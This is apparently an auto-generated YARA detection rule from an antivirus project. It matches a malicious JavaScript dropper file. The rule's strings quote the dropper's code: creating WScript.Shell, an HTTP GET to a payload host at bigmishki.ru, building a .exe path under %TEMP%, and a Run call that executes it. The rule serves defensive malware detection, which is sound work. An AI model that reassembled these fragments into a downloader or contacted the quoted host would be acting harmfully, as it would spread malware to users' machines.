rule sig_20160330_6cd93b74df8557d338c88318fe8ad4c3 {
  meta:
    description = "datamaliciousorder - file 20160330_6cd93b74df8557d338c88318fe8ad4c3.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2855b5531f7af23e3f46aec696b999a59de74a57082bd8b0402ba7d76d767d18"

  strings:
    $s1  = "function P(Z, K){I = I * 1; return Z - K;};" fullword ascii
    $s2  = "var F = function VC() {return WScript[H](\"WScript\"+\".Shell\");}(), JC = 11;" fullword ascii
    $s3  = "C[US](\"GET\", \"http://bigmishki.ru/l3osjf\", false);" fullword ascii
    $s4  = "if (C[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function T(){return E + \"\";};" fullword ascii
    $s6  = "function CG() {return F[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"0IdgO26ybpkF6kK.ex\" + \"e\";};" fullword ascii
    $s7  = "function B(FK){F[\"Run\"](FK, I, I);};" fullword ascii
    $s8  = "function J() {return ((Q0 == true) && (Q0 == E0)) ? 1 : I;};" fullword ascii
    $s9  = "var R = new this[\"Date\"]();" fullword ascii
    $s10 = "}while (Y);" fullword ascii
    $s11 = "return P(U, I0);" fullword ascii
    $s12 = "function W(){return H;};" fullword ascii
    $s13 = "function S(PR) {var ME = (1, 2, 3, 4, 5, PR); return ME;};" fullword ascii
    $s14 = "function KJ()" fullword ascii
    $s15 = "function ML(){return 22;};" fullword ascii
    $s16 = "var E0 = false;" fullword ascii
    $s17 = "E0 = true; " fullword ascii
    $s18 = "var Q0 = false;" fullword ascii
    $s19 = "var OV = false;" fullword ascii
    $s20 = "Q0 = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}